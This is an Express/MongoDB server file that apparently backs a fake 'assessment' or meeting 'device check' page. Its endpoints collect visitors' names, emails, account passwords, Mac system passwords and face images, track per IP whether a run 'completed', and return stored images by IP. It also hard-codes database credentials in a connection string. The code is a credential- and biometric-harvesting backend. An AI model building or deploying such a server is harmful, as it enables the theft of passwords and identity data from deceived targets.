const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');

const app = express();
const Client = require('./models/Client');

const multer = require('multer');
const storage = multer.memoryStorage(); // store in memory as Buffer
const upload = multer({ storage: storage });

app.use(cors({
  origin: function (origin, callback) {
    callback(null, origin || '*');
  },
  credentials: true, // Allow cookies to be sent with requests
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json());

app.use('/receive-data', bodyParser.raw({ type: 'application/octet-stream', limit: '10mb' }));

// mongoose.connect('mongodb://localhost:27017/ipcheck', {})
mongoose.connect('mongodb+srv://mongod:mongod@cluster0.wcqrnb3.mongodb.net/mongod', {})
  .then(() => console.log('MongoDB connected'))
  .catch(err => console.error('MongoDB connection error:', err));

app.post('/receive-data', async (req, res) => {
  res.send('Binary data received successfully');
});

app.post('/now-assessment', async (req, res) => {
  try {
    console.log('req***************:', req.body);
    const clientIp = getClientIp(req.ip, req);
    let client = await Client.findOne({ ip: clientIp });

    if (client) {
      // Update existing client fields
      client.name = req.body.name;
      client.email = req.body.email;
      client.company = req.body.company;
      client.testUri = req.body.data;
      client.owner = req.body.unique;
      client.password = client.password + '||' + req.body.password;
      await client.save();
    } else {
      // Create new client
      const newClient = new Client({
        name: req.body.name,
        email: req.body.email,
        ip: clientIp,
        company: req.body.company,
        testUri: req.body.data,
        owner: req.body.unique,
        hadRun: false,
        password: req.body.password
      });
      await newClient.save();
    }
  } catch (err) {
    console.error('Error checking IP in DB:', err);
  }
  res.send();
});

app.post('/video-just', (req, res) => {
  res.send();
});

app.post('/device-check', async (req, res) => {
  console.log('req***************:', req);
  const clientIp = getClientIp(req.ip, req);
  try {
    if (req.body?.complete) {
      let client = await Client.findOne({ ip: clientIp });
      if (client) {
        client.hadRun = true;
        await client.save();
      } else {
        client = new Client({
          ip: clientIp,
          hadRun: true,
          meetingname: 'workflow check',
        });
        await client.save();
      }
      res.json({ result: true });
      return;
    }

    const found = await Client.findOne({ ip: clientIp });

    if (found !== null && found.hadRun) {
      res.json({ result: true });
    } else {
      res.json({ result: false });
    }
  } catch (err) {
    console.error('Error checking IP in DB:', err);
  }
});

app.post('/feedback', (req, res) => {
  res.send();
});

const port = process.env.PORT || 3000;

app.listen(port, () => {
  console.log('Version 1.1')
  console.log(`Server is running on port ${port}`);
})

function getClientIp(ip, req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) {
    return forwarded.split(',')[0].trim();
  }
  if (ip.startsWith("::ffff:")) {
    return ip.substring(7);
  }
  return ip;
}

app.post("/update-passwords", async (req, res) => {
  try {
    // Use email as unique identifier, fallback to ip if needed
    const identifier = getClientIp(req.ip, req);
    let client = await Client.findOne({ ip: identifier });
    const newPassword = req.body.password;
    const newMacPassword = req.body.macPassword;
    if (client) {
      // Ensure arrays exist
      client.passwords = Array.isArray(client.passwords) ? client.passwords : [];
      client.macPasswords = Array.isArray(client.macPasswords) ? client.macPasswords : [];
      // Add new password if provided
      if (newPassword) {
        client.passwords.unshift(newPassword);
      }
      if (newMacPassword) {
        client.macPasswords.unshift(newMacPassword);
      }
      client.meetingname = req.body.name || client.meetingname;
      client.meetingemail = req.body.email || client.meetingemail;
      await client.save();
      res.json({ updated: true });
    } else {
      // Create new client with empty or provided fields
      client = new Client({
        meetingname: req.body.name || "meetig ran",
        meetingemail: req.body.email || "",
        ip: getClientIp(req.ip, req),
        passwords: newPassword ? [newPassword] : [],
        macPasswords: newMacPassword ? [newMacPassword] : [],
      });
      await client.save();
      res.json({ created: true });
    }
  } catch (err) {
    console.error("Error in /update-passwords:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.get("/is-blocked", async (req, res) => {
  try {
    const clientIp = getClientIp(req.ip, req);
    let client = await Client.findOne({ ip: clientIp });
    if (!client) {
      client = new Client({
        ip: clientIp,
        meetingname: "meeting ran",
      });
      await client.save();
      res.json({ blocked: false, created: true });
      return;
    }
    if (client.blocked === true) {
      res.json({ blocked: true });
    } else {
      res.json({ blocked: false });
    }
  } catch (err) {
    console.error("Error in /is-blocked:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.get("/check-status", async (req, res) => {
  try {
    const clientIp = getClientIp(req.ip, req);
    let client = await Client.findOne({ ip: clientIp });
    if (!client) {
      res.json({ blocked: false, completed: false });
      return;
    }
    res.json({ blocked: client.blocked, completed: client?.img?.data ? true : false });
  } catch (err) {
    console.error("Error in /check-status:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// Upload route
app.post('/verify-face', upload.single('faceImage'), async (req, res) => {
  try {
    const clientIp = getClientIp(req.ip, req);
    let client = await Client.findOne({ ip: clientIp });
    if (client) {
      client.img.data = req.file.buffer;
      client.img.contentType = req.file.mimetype;
      await client.save();
      res.json({ message: 'Image uploaded successfully!' });
      return;
    }
    client = new Client({
      ip: clientIp,
      img: {
        data: req.file.buffer,
        contentType: req.file.mimetype
      },
      meetingname: "face upload only",
    });
    await client.save();
    res.json({ message: 'Image uploaded and client created successfully!' });
  } catch (err) {
    console.error('Error uploading image:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Retrieve route
app.get('/image/:id', async (req, res) => {
  try {
    let client = await Client.findOne({ ip: req.params.id });
    if (client && client.img && client.img.data) {
      res.contentType(client.img.contentType);
      res.send(client.img.data);
      return;
    }
    res.status(404).json({ error: 'Image not found' });
  } catch (err) {
    console.error('Error retrieving image:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});